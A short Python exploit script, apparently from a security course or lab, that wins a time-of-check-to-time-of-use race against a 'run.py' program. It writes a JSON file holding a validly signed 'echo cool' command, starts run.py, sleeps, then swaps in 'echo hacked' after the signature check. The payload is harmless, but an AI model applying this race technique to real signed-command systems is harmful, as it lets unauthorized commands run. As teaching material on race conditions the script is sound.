import json
import subprocess
import time

def change_json_file(path):
	"""
	Method to change json file object to our desired command
	"""
	# read original file content
	with open(path) as reader:
		data = json.load(reader)

	# change to whatever command we want - in our case just echo hacked
	data["command"] = 'echo hacked'

	# save the new json object to the same file overriding the original content
	json_data = json.dumps(data)
	with open(path, 'w') as writer:
		writer.write(json_data)

def write_example_json_file(path):
	"""
	Method to write a working command. combination of command and mathing signature
	"""
	data = {"command": "echo cool", "signature": "6c68e3c88a87339fa8667cb36c82d4cf0bdcc131efcf98eb8df1867122e66e0e2e9d8d1ce01c40261fb8bde61a7768215c20febc2cd522af3a2232be73cabe3ada6d86b1635a52c787bd7d97985f4ce2ef9b47ea0c72bdb35b702f9169218adc2d4cd53eabfc3c875bef05270b703d407afb5b22198d56f3489ec8e3241c19a9"}
	json_data = json.dumps(data)
	with open(path, 'w') as writer:
		writer.write(json_data)


def main(argv):
	if not 1 <= len(argv) <= 2:
		print('USAGE: %s <script-path>' % argv[0])
		return 1

	if len(argv) == 2:
		path = argv[1]
	else:
		path = "hack"

	try:

		# First we must have a valid payload for the authentication part
		write_example_json_file(path)

		# Executre the run.py script in a child process
		p = subprocess.Popen(["python", "run.py", path],
	             stdin=None, stdout=None, stderr=None, close_fds=True)

		# Sleep for a while before changing the file's content.
		# Most likely it will initiate a context switch to the child process running run.py
		time.sleep(1)

		# Most likely that this current (father) process will continue after the authentication part in run.py had occurred
		# All we need to do now is to change the content before the execution phase - result in a TOCTTOU vulnerabilty
		change_json_file(path)

		# Wait for the child process to finish, not mandatory but prefered.
		p.wait()

	except Exception as error:
		print('ERROR: %s' % error)
		return -1

if __name__ == '__main__':
    import sys
    sys.exit(main(sys.argv))
